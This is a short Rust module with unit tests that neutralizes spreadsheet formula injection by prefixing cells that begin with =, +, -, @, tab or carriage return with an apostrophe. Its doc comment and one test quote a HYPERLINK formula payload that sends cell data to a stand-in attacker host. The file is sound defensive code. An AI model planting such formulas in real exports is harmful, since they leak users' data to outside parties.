//! Keeping cell text from running as a spreadsheet formula.
//!
//! Spreadsheets read a CSV or pasted cell that starts with `=`, `+`, `-`
//! or `@` as a formula, and some also treat a leading tab or carriage
//! return that way. Data from a server can carry such a cell on purpose
//! (`=HYPERLINK("https://attacker/?"&A1)`, DDE payloads), so exports and
//! copies can opt into neutralizing it with a leading `'`, the escape every
//! spreadsheet shows as plain text.

use std::borrow::Cow;

/// `text` with a leading `'` when a spreadsheet would read it as a formula,
/// `text` itself otherwise.
pub fn protect_spreadsheet_formula(text: &str) -> Cow<'_, str> {
    if starts_like_formula(text) {
        Cow::Owned(format!("'{text}"))
    } else {
        Cow::Borrowed(text)
    }
}

fn starts_like_formula(text: &str) -> bool {
    matches!(
        text.chars().next(),
        Some('=' | '+' | '-' | '@' | '\t' | '\r')
    )
}

#[cfg(test)]
mod tests {
    use super::protect_spreadsheet_formula;

    #[test]
    fn formula_starts_get_a_quote() {
        for text in [
            "=HYPERLINK(\"https://example.invalid/?\"&A1,\"x\")",
            "+1+1",
            "-2+3",
            "@SUM(A1:A2)",
            "\t=1",
            "\r=1",
        ] {
            assert_eq!(protect_spreadsheet_formula(text), format!("'{text}"));
        }
    }

    #[test]
    fn other_text_is_unchanged() {
        for text in ["", "plain", " =not first", "'already quoted", "a=b", "1-2"] {
            assert_eq!(protect_spreadsheet_formula(text), text);
        }
    }
}
